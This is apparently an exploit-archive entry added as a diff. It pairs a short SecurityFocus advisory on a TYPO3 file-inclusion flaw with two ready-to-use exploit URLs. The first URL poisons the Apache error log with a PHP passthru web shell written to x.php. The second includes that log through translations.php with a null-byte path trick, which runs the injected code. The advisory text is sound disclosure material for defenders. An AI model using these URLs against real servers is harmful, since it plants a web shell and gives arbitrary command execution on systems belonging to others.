@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/6984/info
+
+TYPO3 is prone to an issue that may allow remote attackers to include files located on attacker-controlled servers.
+
+This vulnerability is as a result of insufficient sanitization performed on remote user-supplied data. Under some circumstances, it is possible for remote attackers to influence the path for an include file to point to an external file by manipulating URI parameters.
+
+If the remote file is a malicious file, this may be exploited to execute arbitrary system commands in the context of the web server. 
+
+http://localhost/<%3f %60echo %27<%3fpassthru(%5c%24c)%3f>%27 >> ./x.php%60 %3f>
+http://localhost/typo3/typo3/dev/translations.php?ONLY=relative_apache_path/apache/logs/error_log%00' 
